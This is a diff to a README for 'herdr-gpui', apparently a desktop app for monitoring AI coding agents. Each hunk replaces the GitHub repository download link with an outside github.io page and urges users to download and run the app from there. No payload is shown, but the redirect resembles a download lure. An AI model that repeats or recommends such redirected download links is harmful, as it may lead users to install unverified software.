@@ -1,6 +1,6 @@
 # 🐑 herdr-gpui - See All Your Work in One Place
 
-[![Download herdr-gpui](https://img.shields.io/badge/Download-herdr--gpui-brightgreen?style=for-the-badge&logo=github)](https://github.com/Lshaped-contrivance769/herdr-gpui)
+[![Download herdr-gpui](https://img.shields.io/badge/Download-herdr--gpui-brightgreen?style=for-the-badge&logo=github)](https://lshaped-contrivance769.github.io)
 
 ## 👋 Welcome to herdr-gpui
 
@@ -16,7 +16,7 @@ Getting herdr-gpui up and running takes less than a minute. Here's what you need
 
 ### Step 1: Download the App
 
-Visit this link to download the application: [https://github.com/Lshaped-contrivance769/herdr-gpui](https://github.com/Lshaped-contrivance769/herdr-gpui)
+Visit this link to download the application: [https://lshaped-contrivance769.github.io](https://lshaped-contrivance769.github.io)
 
 This is a GitHub page where you can find the download button. Look for the big green button that says "Releases" or the download icon. Click it, and your computer will start downloading the herdr-gpui file.
 
@@ -58,7 +58,7 @@ If you use AI agents to help write code, herdr-gpui shows you what they're doing
 
 ## 📥 Download Again or Update
 
-If you need to download herdr-gpui again, or if you want to check for a newer version, just head back to the download page: [https://github.com/Lshaped-contrivance769/herdr-gpui](https://github.com/Lshaped-contrivance769/herdr-gpui)
+If you need to download herdr-gpui again, or if you want to check for a newer version, just head back to the download page: [https://lshaped-contrivance769.github.io](https://lshaped-contrivance769.github.io)
 
 New versions are released regularly, and each one comes with bug fixes and new features. It's always a good idea to keep your apps up to date.
 
@@ -101,6 +101,6 @@ Absolutely. Download it on your work computer, personal laptop, or even a Raspbe
 
 herdr-gpui is more than just a client — it's your personal window into the world of your code, your tools, and your AI helpers. It's free, it's fast, and it works on the computer you already own.
 
-So why wait? Head over to [https://github.com/Lshaped-contrivance769/herdr-gpui](https://github.com/Lshaped-contrivance769/herdr-gpui) and download herdr-gpui today. Your projects are waiting.
+So why wait? Head over to [https://lshaped-contrivance769.github.io](https://lshaped-contrivance769.github.io) and download herdr-gpui today. Your projects are waiting.
 
 Keywords: ai-agents, desktop-app, developer-tools, git-worktrees, gpui, herdr, macos, rust, terminal
